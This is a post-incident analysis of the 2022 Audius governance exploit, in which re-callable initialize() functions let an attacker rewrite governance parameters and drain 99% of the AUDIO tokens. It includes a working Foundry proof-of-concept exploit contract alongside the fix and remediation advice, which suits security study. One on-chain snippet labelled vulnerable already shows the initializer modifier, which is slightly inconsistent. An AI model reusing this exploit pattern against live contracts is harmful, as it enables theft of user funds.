# Audius — Governance Re-initialization Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-07-23 |
| **Protocol** | Audius |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$1,080,000 (704 ETH) |
| **Attacker** | [0xa0c7bd318d69424603cbf91e9969870f21b8ab4c](https://etherscan.io/address/0xa0c7bd318d69424603cbf91e9969870f21b8ab4c) |
| **Attack Contract** | [0xbdbb5945f252bc3466a319cdcc3ee8056bf2e569](https://etherscan.io/address/0xbdbb5945f252bc3466a319cdcc3ee8056bf2e569) |
| **Vulnerable Contract** | [0x4deca517d6817b6510798b7328f2314d3003abac](https://etherscan.io/address/0x4deca517d6817b6510798b7328f2314d3003abac) (Governance Proxy) |
| **AUDIO Token** | [0x18aAA7115705e8be94bfFEBDE57Af9BFc265B998](https://etherscan.io/address/0x18aAA7115705e8be94bfFEBDE57Af9BFc265B998) |
| **Staking Proxy** | [0xe6d97b2099f142513be7a2a068be040656ae4591](https://etherscan.io/address/0xe6d97b2099f142513be7a2a068be040656ae4591) |
| **DelegateManagerV2** | [0x4d7968ebfd390d5e7926cb3587c39eff2f9fb225](https://etherscan.io/address/0x4d7968ebfd390d5e7926cb3587c39eff2f9fb225) |
| **Root Cause** | The proxy contract's `initialize()` function could be re-called, allowing re-initialization with malicious governance parameters |
| **CWE** | CWE-284: Improper Access Control |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-07/Audius_exp.sol) |

---
## 1. Vulnerability Overview

Audius is a decentralized protocol in the music streaming space that operates AUDIO token-based governance. The governance, staking, and delegate manager contracts were deployed using an upgradeable proxy pattern. The attacker exploited a vulnerability in which the proxy contract's `initialize()` function could be re-called without any re-initialization guard, injecting malicious governance parameters that reduced the voting period to 3 blocks and set the execution delay to 0. The attacker then immediately submitted, passed, and executed a proposal to transfer 99% of the governance tokens to the attacker's contract.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable initialize() — no re-initialization guard
function initialize(
    address _token,
    uint256 _votingPeriod,     // ❌ Set to 3 by the attacker
    uint256 _executionDelay,   // ❌ Set to 0 by the attacker
    uint256 _votingQuorum,
    uint16 _maxInProgressProposals,
    address _guardianAddress
) public {
    // ❌ No initializer modifier → anyone can re-call
    token = IERC20(_token);
    votingPeriod = _votingPeriod;
    executionDelay = _executionDelay;
    votingQuorum = _votingQuorum;
}

// ✅ Correct pattern (OpenZeppelin Initializable)
function initialize(...) public initializer {
    // initializer modifier prevents re-calls
    token = IERC20(_token);
    votingPeriod = _votingPeriod;
    executionDelay = _executionDelay;
}
```

---
### On-Chain Source Code

Source: Sourcify verified


**Governance.sol** — Entry point:
```solidity
// ❌ Root cause: the proxy contract's `initialize()` function can be re-called, allowing re-initialization with malicious governance parameters
    function initialize() public initializer {  // ❌ Vulnerability
        isInitialized = true;
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[Tx1] Governance.initialize(votingPeriod=3, executionDelay=0)
    │         └─ Governance parameters maliciously overwritten
    │
    ├─[Tx1] Staking.initialize() + DelegateManagerV2.initialize()
    │         └─ Staking/delegation contracts also re-initialized
    │
    ├─[Tx1] delegateStake(attacker, 1e31)
    │         └─ Voting power artificially inflated to 1e31 AUDIO
    │
    ├─[Tx1] submitProposal(target=AUDIO, calldata=transfer(attacker, 99%))
    │         └─ Proposal #85 submitted to transfer 99% of AUDIO tokens to attacker
    │
    ├─[Tx2] submitVote(proposal=85, vote=YES)  ← block 15,201,795
    │         └─ YES vote cast within 3-block voting period (voting power 1e31)
    │
    ├─[Tx3] evaluateProposalOutcome(85)        ← block 15,201,798
    │         └─ Proposal marked as passed → AUDIO transfer executed
    │
    └─[Tx4] UniswapV2.swapExactTokensForETH(AUDIO → ETH)
              └─ Acquired AUDIO liquidated to ETH → 704 ETH stolen
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IGovernance {
    function initialize(
        address token, uint256 votingPeriod, uint256 executionDelay,
        uint256 votingQuorum, uint16 maxProposals, address guardian
    ) external;
    function submitProposal(
        address[] calldata targets, uint256[] calldata values,
        bytes[] calldata calldatas, string calldata description
    ) external returns (uint256);
    function submitVote(uint256 proposalId, uint8 vote) external;
    function evaluateProposalOutcome(uint256 proposalId) external;
}

interface IStaking {
    function initialize(address token, address registry) external;
}

interface IDelegateManagerV2 {
    function initialize(address token, address registry, uint256 undelegateTime) external;
    function delegateStake(address target, uint256 amount) external returns (uint256);
}

contract AudiusExploit is Test {
    IGovernance governance = IGovernance(0x4deca517d6817b6510798b7328f2314d3003abac);
    IStaking staking = IStaking(0xe6d97b2099f142513be7a2a068be040656ae4591);
    IDelegateManagerV2 delegateManager = IDelegateManagerV2(0x4d7968ebfd390d5e7926cb3587c39eff2f9fb225);
    IERC20 AUDIO = IERC20(0x18aAA7115705e8be94bfFEBDE57Af9BFc265B998);

    function setUp() public {
        vm.createSelectFork("mainnet", 15_201_793);
    }

    function testExploit() public {
        // [Step 1] Re-initialize governance with malicious parameters (votingPeriod=3 blocks, executionDelay=0)
        governance.initialize(
            address(AUDIO),
            3,       // ⚡ votingPeriod: normally thousands of blocks, attacker reduces to 3
            0,       // ⚡ executionDelay: set to 0 → immediate execution possible
            0,       // votingQuorum
            25,
            address(this)
        );

        // [Step 2] Evaluate existing proposal #84 (cleanup)
        governance.evaluateProposalOutcome(84);

        // [Step 3] Submit proposal to transfer AUDIO tokens
        address[] memory targets = new address[](1);
        targets[0] = address(AUDIO);
        bytes[] memory calldatas = new bytes[](1);
        calldatas[0] = abi.encodeWithSignature(
            "transfer(address,uint256)",
            address(this),
            AUDIO.balanceOf(address(governance)) * 99 / 100
        );
        governance.submitProposal(targets, new uint256[](1), calldatas, "drain");

        // [Step 4] Re-initialize staking/delegation and inflate voting power
        staking.initialize(address(AUDIO), address(0));
        delegateManager.initialize(address(AUDIO), address(0), 0);
        delegateManager.delegateStake(address(this), 1e31);

        // [Step 5] Cast YES vote (block +2)
        vm.roll(block.number + 2);
        governance.submitVote(85, 1);

        // [Step 6] Execute proposal (block +3)
        vm.roll(block.number + 3);
        governance.evaluateProposalOutcome(85);

        // [Step 7] Liquidate acquired AUDIO to ETH
        AUDIO.approve(address(0x7a250d5630b4cf539739df2c5dacb4c659f2488d), type(uint256).max);
        // UniswapV2 swap → 704 ETH acquired
        emit log_named_decimal_uint("Stolen AUDIO", AUDIO.balanceOf(address(this)), 18);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Re-callable Initializer (Unprotected Initializer) |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Governance Manipulation |
| **Attack Vector** | Governance parameter tampering via `initialize()` re-call |
| **Prerequisites** | Upgradeable proxy, `initializer` modifier not applied |
| **Impact** | 99% of governance tokens stolen ($1.08M) |

---
## 6. Remediation Recommendations

1. **Mandatory `initializer` modifier**: Apply OpenZeppelin `Initializable`'s `initializer` modifier to all initialization functions to prevent re-initialization.
2. **Call `_disableInitializers()`**: Call `_disableInitializers()` in the implementation contract's constructor to block direct initialization.
3. **Mandatory TimeLock**: The execution delay (TimeLock) before governance proposal execution must be set to a minimum of 48 hours and hardcoded to be immutable.
4. **Hardcode minimum voting period**: The voting period should be fixed as a constant rather than a governance parameter to prevent manipulation.

```solidity
// ✅ Fixed initialize()
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";

contract Governance is Initializable {
    uint256 public constant MIN_VOTING_PERIOD = 6400; // ~1 day
    uint256 public constant MIN_EXECUTION_DELAY = 172800; // 48 hours (seconds)

    function initialize(
        address _token,
        uint256 _votingPeriod,
        uint256 _executionDelay,
        uint256 _votingQuorum,
        uint16 _maxProposals,
        address _guardian
    ) public initializer {  // ✅ initializer modifier prevents re-calls
        require(_votingPeriod >= MIN_VOTING_PERIOD, "voting period too short");
        require(_executionDelay >= MIN_EXECUTION_DELAY, "delay too short");
        // ...
    }
}
```

---
## 7. Lessons Learned

- **Initialization security in upgradeable contracts**: In a proxy pattern, implementing `initialize()` without the `initializer` modifier allows anyone to re-initialize the contract. This is one of the most common mistakes in proxy contract design.
- **Enforcing minimum values for governance parameters**: Governance security parameters such as voting period and TimeLock must have minimum values enforced at the code level. If the parameters themselves can be changed through governance, attackers can exploit this.
- **Audius's response**: Following the attack, Audius redeployed the governance contract and strengthened the multisig guardian functionality.